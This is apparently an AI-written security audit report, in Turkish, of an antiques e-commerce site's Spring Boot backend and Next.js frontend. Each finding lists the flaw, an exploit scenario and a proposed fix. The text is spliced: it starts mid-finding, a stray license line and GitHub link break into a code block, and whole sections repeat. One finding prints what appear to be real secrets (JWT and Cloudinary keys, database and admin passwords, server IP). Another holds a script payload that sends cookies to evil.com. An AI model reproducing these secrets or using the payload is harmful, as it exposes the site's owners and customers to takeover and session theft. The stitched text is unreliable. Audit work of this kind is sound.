`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

